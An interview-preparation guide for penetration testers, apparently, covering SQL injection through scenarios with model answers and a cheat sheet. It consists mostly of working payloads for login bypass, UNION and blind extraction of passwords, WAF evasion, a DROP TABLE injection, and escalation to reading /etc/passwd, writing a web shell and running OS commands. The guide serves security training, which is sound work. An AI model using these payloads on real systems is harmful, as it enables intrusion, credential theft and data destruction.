# 💉 SQL Injection — Interview Scenarios & Deep Explanations

> *Every answer you give must be explainable — WHY you did it, WHAT each part does, and WHAT ELSE you could try.*

---

## Scenario 1: Basic Detection (Medium)

**🎯 Interviewer:** "You're testing a login page. How do you check for SQL injection?"

### ✅ Model Answer:

"First, I'd understand what's happening behind the scenes. A login form likely runs a query like:

```sql
SELECT * FROM users WHERE username = '[input]' AND password = '[input]'
```

I'd test the username field first by injecting a single quote (`'`). If I get a 500 error or a database error message, the input is reaching the query unsanitized.

To confirm, I'd try:
- `' OR '1'='1` — if this logs me in, there's no parameterization
- `' OR '1'='2` — this should fail (false condition), proving boolean control
- `admin'--` — this comments out the password check entirely

I'd also check the password field separately — sometimes one field is sanitized but the other isn't."

### 🔥 Follow-up Challenges:

**Q: "Explain what `admin'--` actually does character by character."**

> - `admin` → the username value
> - `'` → closes the string delimiter the developer opened
> - `--` → SQL comment syntax, everything after this is ignored
> - So the query becomes: `SELECT * FROM users WHERE username = 'admin'-- ' AND password = 'whatever'`
> - The password check is completely eliminated

**Q: "What if the app shows a generic 'Login failed' for both wrong user and wrong password?"**

> "Then I can't rely on error messages. I'd switch to time-based blind injection:
> - `admin' AND SLEEP(5)--` — if the response takes 5 seconds, injection confirmed
> - `admin' AND IF(1=1, SLEEP(5), 0)--` — conditional delay to verify boolean control
> - I'd monitor response times carefully — even 100ms difference can be an indicator"

**Q: "What if there's a WAF blocking `'` and `--`?"**

> "Several bypass options:
> 1. Use `\"` instead of `'` if the query uses double quotes
> 2. Use `#` instead of `--` (MySQL comment)
> 3. URL-encode: `%27` for `'`, `%2D%2D` for `--`
> 4. Double URL-encode: `%2527` for `'`
> 5. Try `admin' AND '1'='1` without needing a comment (balanced quotes)
> 6. Use null byte: `admin'%00`"

---

## Scenario 2: UNION-Based Extraction (Medium-Hard)

**🎯 Interviewer:** "You confirmed SQLi in a product search. How do you extract the database contents?"

### ✅ Model Answer:

"I'd follow a systematic UNION-based extraction approach:

**Step 1 — Find column count:**
```
' ORDER BY 1-- 
' ORDER BY 2-- 
' ORDER BY 3--    ← works
' ORDER BY 4--    ← error → table has 3 columns
```

**Step 2 — Find which columns display on page:**
```
' UNION SELECT 'aaa','bbb','ccc'-- 
```
If 'bbb' appears on the page, column 2 is my output channel.

**Step 3 — Identify the database:**
```
' UNION SELECT NULL,@@version,NULL--     (MySQL)
' UNION SELECT NULL,version(),NULL--     (PostgreSQL)
```

**Step 4 — Extract table names:**
```sql
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema=database()--
```

**Step 5 — Extract column names:**
```sql
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--
```

**Step 6 — Extract data:**
```sql
' UNION SELECT NULL,CONCAT(username,':',password),NULL FROM users--
```

I use `CONCAT` to combine multiple columns into one output channel."

### 🔥 Follow-up Challenges:

**Q: "Why ORDER BY and not just guessing column count?"**

> "ORDER BY is reliable because:
> - It works regardless of data types (you can ORDER BY column number)
> - It produces a clear error boundary (works → fails at exact column count + 1)
> - UNION SELECT with wrong count also errors, but ORDER BY is cleaner
> - Alternative: `' UNION SELECT NULL-- `, `' UNION SELECT NULL,NULL-- ` etc., adding NULLs until no error"

**Q: "What if UNION is blocked by WAF?"**

> "I'd switch to:
> 1. **Boolean-blind:** `' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--` — extract char by char
> 2. **Time-blind:** `' AND IF((SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a', SLEEP(3), 0)--`
> 3. **Error-based:** `' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT username FROM users LIMIT 1)))--`
> 4. **WAF bypass for UNION:** `uNiOn SeLeCt`, `UN/**/ION`, `UNION%0aSELECT`, `/*!UNION*/ SELECT`"

**Q: "Explain what `information_schema` is and why it's important."**

> "It's a meta-database present in MySQL, PostgreSQL, and MSSQL. It contains information about ALL other databases, tables, and columns on the server. Key tables:
> - `information_schema.tables` → lists all tables (table_name, table_schema)
> - `information_schema.columns` → lists all columns (column_name, table_name)
> - `information_schema.schemata` → lists all databases
> - Without it, we'd be guessing table names. With it, we have a complete map."

---

## Scenario 3: Blind SQL Injection (Hard)

**🎯 Interviewer:** "The application returns the same page regardless of what you inject — no errors, no data displayed. But you suspect SQLi. What now?"

### ✅ Model Answer:

"This is a blind SQLi scenario. I have two approaches:

**Boolean-Blind — if there's ANY detectable difference:**
```
' AND 1=1--    → observe page (content length, specific text, HTTP status)
' AND 1=2--    → compare the difference
```

Even a single character difference or different response size confirms boolean control.

**Then extract data character by character:**
```sql
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='b'--
```
When the 'true' page appears, I've found the character. I use binary search with ASCII values to speed this up:
```sql
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) > 77--
```
This halves the search space each time — instead of 26+ guesses per char, it's ~7.

**Time-Blind — if there's NO observable difference:**
```sql
' AND IF(1=1, SLEEP(5), 0)--    → 5 second delay = true
' AND IF(1=2, SLEEP(5), 0)--    → instant response = false
```

Then same extraction logic but using time as the oracle:
```sql
' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) > 77, SLEEP(3), 0)--
```

I'd automate this with a Python script or Burp Intruder, not manually."

### 🔥 Follow-up Challenges:

**Q: "Why binary search instead of linear?"**

> "Efficiency. With linear (trying a, b, c, d...), worst case is 95 requests per character (printable ASCII). With binary search on ASCII values (0-127), it's only 7 requests per character (log₂128 = 7). For a 32-char password hash, that's 224 requests vs 3,040. Massive difference."

**Q: "What if SLEEP is blocked?"**

> "Alternatives for time-based:
> - `BENCHMARK(10000000, SHA1('test'))` — CPU-intensive operation
> - `' AND (SELECT COUNT(*) FROM information_schema.tables A, information_schema.tables B)--` — heavy query
> - PostgreSQL: `pg_sleep(5)`
> - MSSQL: `WAITFOR DELAY '0:0:5'`"

**Q: "How would you automate this?"**

> "I'd write a Python script using `requests` library:
> 1. Loop through each character position
> 2. Binary search on ASCII range 32-126
> 3. Measure response time (for time-blind) or check content (for boolean-blind)
> 4. Build the extracted string character by character
> 5. Add threading for multiple positions simultaneously
> 
> Or use sqlmap with `--technique=T` for time-blind, `--technique=B` for boolean-blind. But I'd always confirm manually first before automating."

---

## Scenario 4: Second-Order SQL Injection (Hard)

**🎯 Interviewer:** "You register a new user and your username is stored in the database. Later, an admin panel displays your username in a query. How would you exploit this?"

### ✅ Model Answer:

"This is second-order SQL injection — the payload is stored first and executed later in a different context.

**Step 1:** Register with username: `admin'--`

The registration form might sanitize or parameterize the INSERT query, so the username is safely stored as the literal string `admin'--`.

**Step 2:** When the admin panel runs a query like:
```sql
SELECT * FROM logs WHERE username = '$stored_username'
```
My stored username breaks out of the string: `WHERE username = 'admin'--'`

**Step 3:** This effectively becomes: show me admin's logs (everything after `--` is ignored).

**More dangerous payload for registration:**
```
' UNION SELECT username, password FROM users--
```

When this username gets used in a different query context, it triggers the UNION extraction.

**Why this is hard to detect:**
- The first query (INSERT during registration) is safe — parameterized
- The vulnerability is in the second query that USES the stored data
- Developers assume 'data from our own database is safe' — wrong!
- Scanners test input→output directly; they can't find this"

### 🔥 Follow-ups:

**Q: "How would you find this in a real pentest?"**

> "I'd register multiple accounts with different SQL metacharacters as usernames: `'`, `''`, `' OR '1'='1`, `admin'--`. Then I'd browse every page where usernames appear — admin panels, user lists, activity logs, emails. If any of those contexts break or behave differently, I've found a second-order injection point."

---

## Scenario 5: SQL Injection in Different Contexts (Medium)

**🎯 Interviewer:** "SQL injection isn't always in text fields. Where else have you found it?"

### ✅ Model Answer:

"Injection can occur in any parameter that reaches a SQL query:

| Context | Example | Payload Approach |
|---------|---------|-----------------|
| **URL parameters** | `/product?id=5` | `5 OR 1=1` (numeric, no quotes needed) |
| **Cookies** | `session=abc123` | Same techniques in cookie values |
| **HTTP Headers** | `X-Forwarded-For`, `User-Agent`, `Referer` | Apps often log these with SQL |
| **JSON body** | `{"user": "admin"}` | `{"user": "admin'--"}` |
| **ORDER BY clause** | `?sort=name` | `name ASC; DROP TABLE--` (different syntax) |
| **LIMIT/OFFSET** | `?page=2` | Integer injection, no quotes |
| **File names** | Upload with name `test'.jpg` | If filename is stored via SQL |

**Key insight:** Numeric injection doesn't need quotes! If the query is:
```sql
SELECT * FROM products WHERE id = [input]
```
The payload is just: `1 OR 1=1` — no quote needed to break out.

The most commonly missed spots are HTTP headers (especially `User-Agent` and `X-Forwarded-For` which get logged) and JSON API bodies."

---

## Quick Recall — SQL Injection Cheat Sheet

```
DETECTION:
  '           → does it break?
  ''          → does the error go away?
  ' OR '1'='1 → boolean true
  ' OR '1'='2 → boolean false
  ' AND SLEEP(5)-- → time-based confirm

DATABASES:
  MySQL:      @@version, SLEEP(), #, --, information_schema
  PostgreSQL: version(), pg_sleep(), --, information_schema
  MSSQL:      @@version, WAITFOR DELAY, --, information_schema
  Oracle:     banner FROM v$version, DUAL table, no --

WAF BYPASS:
  Case:     uNiOn SeLeCt
  Comments: UN/**/ION, /*!UNION*/
  Encoding: %27 ('), %2527 (double), CHAR(39)
  Whitespace: %0a, %09, %0d, +, /**/
  
IMPACT ESCALATION:
  Read files:  LOAD_FILE('/etc/passwd')  (MySQL)
  Write files: INTO OUTFILE '/var/www/shell.php'
  OS command:  xp_cmdshell (MSSQL)
```

---

> **Practice:** For each scenario above, explain your answer OUT LOUD as if someone is listening. If you stumble, you don't know it well enough yet.
